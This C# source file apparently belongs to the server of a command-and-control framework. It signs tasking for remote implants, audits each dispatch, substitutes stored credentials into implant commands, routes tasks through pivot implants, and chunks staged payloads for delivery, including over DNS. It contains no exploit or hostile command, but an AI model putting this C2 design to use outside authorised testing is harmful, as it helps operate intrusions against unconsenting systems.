using System.Security.Cryptography;
using Google.Protobuf;
using Rod.Audit;
using Rod.CoreState;
using Rod.CoreState.Application;
using Rod.CoreState.Collaboration;
using Rod.CoreState.Pki;
using Rod.CoreState.Tasks;
using Rod.V1;
using Task = System.Threading.Tasks.Task;

namespace Rod.Transport.Endpoints;

// The shared downstream-tasking composition for every beacon transport
// (architecture.md Sec 8): build the signed TaskRequest frame, record the
// dispatch in the audit trail, and slice a staged payload into its chunk run.
// Extracted from BeaconEndpoint so the live beacon carriages and the envelope
// deliver byte-identical tasking -- the signature, the staged marker, and
// the TaskDispatched audit write have exactly one implementation.

/// <summary>
/// Marshals dispatched tasking for every beacon transport: the signed
/// <see cref="TaskRequest"/> frame, its audit record, and the staged-payload
/// chunk run a StagedPull demands. Singleton: stateless composition over the
/// tasking CA, the audit and artifact stores, and the task-reference
/// resolver.
/// </summary>
internal sealed class BeaconTasking
{
    // The downstream chunk size for staged payloads: the same budget the
    // implant's exfil chunker honors, so a marshaled Frame fits the transport
    // message cap with protobuf overhead to spare in both directions.
    public const int StagedChunkSize = 512 * 1024;

    private readonly IImplantCertificateAuthority _ca;
    private readonly IAuditStore _audit;
    private readonly IArtifactStore _artifacts;
    private readonly TaskReferenceService? _references;

    public BeaconTasking(
        IImplantCertificateAuthority ca,
        IAuditStore audit,
        IArtifactStore artifacts,
        TaskReferenceService? references = null)
    {
        _ca = ca;
        _audit = audit;
        _artifacts = artifacts;
        _references = references;
    }

    /// <summary>
    /// Builds the signed <see cref="TaskRequest"/> for a dispatched task: the
    /// typed arm's staged marker when the task carries server-side payload, the
    /// replay nonce when the implant negotiated that arm (architecture.md
    /// Sec 9 -- the nonce rides the field and the signature together, so the
    /// five-element tuple the negotiating implant verifies is exactly what was
    /// signed), and the CA's command signature over the canonical tuple --
    /// the implant id binds the task to its intended executor, and the implant
    /// verifies against the CA it already trusts before executing.
    /// </summary>
    public Task<TaskRequest> BuildSignedRequestAsync(TaskDispatched dispatched, CancellationToken cancellationToken = default)
        => BuildSignedRequestAsync(dispatched, fronting: null, cancellationToken);

    /// <summary>
    /// The fronting half (architecture.md Sec 5.2, the Pivot class): when
    /// <paramref name="fronting"/> names a stream's implant and the task
    /// targets another -- a Pivot child the stream fronts -- the frame is
    /// marked with the target's id so the fronting implant knows to execute
    /// on the child's behalf. The signature still signs the target's own id
    /// (Sec 9): the tuple's executor binding is unchanged, the marker only
    /// routes. A null or matching <paramref name="fronting"/> produces the
    /// ordinary own-tasking shape, byte-for-byte.
    ///
    /// Credential placeholders in the arguments resolve here and nowhere
    /// else (architecture.md Sec 15.3, ADR-005): the frame and its signature
    /// carry the secret the implant executes, while the task row, the live
    /// bus, and the TaskDispatched audit record keep the placeholder form
    /// the operator wrote -- the plaintext never lands in a store.
    /// </summary>
    public async Task<TaskRequest> BuildSignedRequestAsync(
        TaskDispatched dispatched,
        ImplantId? fronting,
        CancellationToken cancellationToken = default)
    {
        var arguments = dispatched.Arguments;
        if (_references is not null && TaskReferences.ContainsCredential(arguments))
        {
            arguments = await _references.SubstituteCredentialsAsync(
                dispatched.EngagementId, arguments, cancellationToken);
        }

        var request = new TaskRequest
        {
            TaskId = dispatched.TaskId.ToString(),
            Verb = dispatched.Verb,
            Arguments = arguments,
        };
        // The typed arm's marker (architecture.md Sec 10): a staged task tells
        // the implant its payload is server-side and demanded, not inline. The
        // sha256 token inside the signed arguments stays the integrity
        // authority; the marker only switches the implant's grammar.
        if (dispatched.StagedBytes is { } stagedBytes)
            request.StagedBytes = (ulong)stagedBytes;
        if (dispatched.Nonce is { } nonce)
            request.TaskNonce = nonce;
        if (fronting is { } stream && stream != dispatched.ImplantId)
            request.TargetImplantId = dispatched.ImplantId.ToString();
        request.Signature = ByteString.CopyFrom(
            _ca.SignTasking(dispatched.ImplantId.ToString(), request.TaskId, request.Verb, request.Arguments, dispatched.Nonce));
        return request;
    }

    /// <summary>
    /// Frames the signed request as the opaque <see cref="Frame"/> every
    /// transport writes downstream.
    /// </summary>
    public async Task<Frame> MarshalFrameAsync(TaskDispatched dispatched, CancellationToken cancellationToken = default)
        => new() { Payload = ByteString.CopyFrom((await BuildSignedRequestAsync(dispatched, cancellationToken)).ToByteArray()) };

    /// <summary>
    /// The fronting marshal: the frame for a stream whose implant may front
    /// the task's target (architecture.md Sec 5.2). See
    /// <see cref="BuildSignedRequestAsync(TaskDispatched, ImplantId?, CancellationToken)"/>.
    /// </summary>
    public async Task<Frame> MarshalFrameAsync(TaskDispatched dispatched, ImplantId fronting, CancellationToken cancellationToken = default)
        => new() { Payload = ByteString.CopyFrom((await BuildSignedRequestAsync(dispatched, fronting, cancellationToken)).ToByteArray()) };

    /// <summary>
    /// Records the dispatch (architecture.md Sec 11). Dispatch is server-driven
    /// (the implant pulls the queue), so the event is attributed to the operator
    /// whose tasking it carries out. The payload is the verb/arguments and the
    /// outcome the dispatched task id -- a task's full attributed arc is
    /// TaskIssued -&gt; TaskDispatched -&gt; TaskCompleted.
    /// </summary>
    public Task RecordDispatchAsync(TaskDispatched dispatched, CancellationToken cancellationToken)
        => _audit.AppendAsync(
            AuditEvent.Fact(
                eventId: Guid.NewGuid(),
                engagementId: dispatched.EngagementId.Value,
                operatorId: dispatched.IssuedBy.Value,
                implantId: dispatched.ImplantId.Value,
                taskId: dispatched.TaskId.Value,
                verb: dispatched.Verb,
                kind: AuditEventKind.TaskDispatched,
                payload: dispatched.Arguments,
                output: null,
                outcome: dispatched.TaskId.ToString(),
                at: dispatched.DispatchedAt),
            cancellationToken);

    /// <summary>
    /// Slices a demanded task's staged payload into its downstream chunk run:
    /// the task-bound artifact the issuer staged, cut at the frame-budget chunk
    /// size, 0-origin sequences, terminal on the last chunk. A demand whose
    /// staged bytes are gone (an expired store, a restart that lost the
    /// in-memory artifacts) is answered with a single empty terminal chunk so
    /// the implant resolves and fails the hash check honestly rather than
    /// waiting on chunks that will never come.
    /// </summary>
    public Task<IReadOnlyList<Frame>> StagedChunkRunAsync(Guid taskId, CancellationToken cancellationToken)
        => StagedChunkRunAsync(taskId, resumeOffset: null, prefixSha256: null, cancellationToken);

    /// <summary>
    /// The resuming half (architecture.md Sec 15.3, ADR-010): a demand that
    /// names an offset and proves the bytes it holds by SHA-256 is answered
    /// from that seam -- only the unserved remainder crosses the wire again.
    /// A resume the served payload cannot honor (a prefix that hashes
    /// differently, an offset past the end) falls back to the whole run from
    /// 0, and the run's first chunk carries offset 0, the signal a resuming
    /// implant resets its held bytes on. Every chunk carries its absolute
    /// byte position, so placement never depends on chunk alignment -- the
    /// DNS carriage serves answer-sized slices, not 512 KiB ones.
    /// </summary>
    public async Task<IReadOnlyList<Frame>> StagedChunkRunAsync(
        Guid taskId,
        ulong? resumeOffset,
        byte[]? prefixSha256,
        CancellationToken cancellationToken)
    {
        var staged = (await _artifacts.ForTaskAsync(taskId, cancellationToken))
            .FirstOrDefault(a => a.Name == StagedArtifacts.NameFor(taskId));
        var content = staged?.Content ?? Array.Empty<byte>();

        var start = 0L;
        if (resumeOffset is { } demanded
            && demanded <= (ulong)content.Length
            && prefixSha256 is { Length: 32 } proof
            && SHA256.HashData(content.AsSpan(0, (int)demanded)).AsSpan().SequenceEqual(proof))
        {
            start = (long)demanded;
        }

        var frames = new List<Frame>((int)((content.Length - start) / StagedChunkSize) + 1);
        for (var offset = start; ; offset += StagedChunkSize)
        {
            var end = Math.Min(offset + StagedChunkSize, content.Length);
            var slice = new byte[end - offset];
            Array.Copy(content, offset, slice, 0, slice.Length);
            var chunk = new StagedChunk
            {
                TaskId = new TaskId(taskId).ToString(),
                Sequence = (ulong)((offset - start) / StagedChunkSize),
                Offset = (ulong)offset,
                Terminal = end == content.Length,
                Data = ByteString.CopyFrom(slice),
            };
            frames.Add(new Frame { Payload = ByteString.CopyFrom(chunk.ToByteArray()) });
            if (chunk.Terminal)
                break;
        }
        return frames;
    }
}
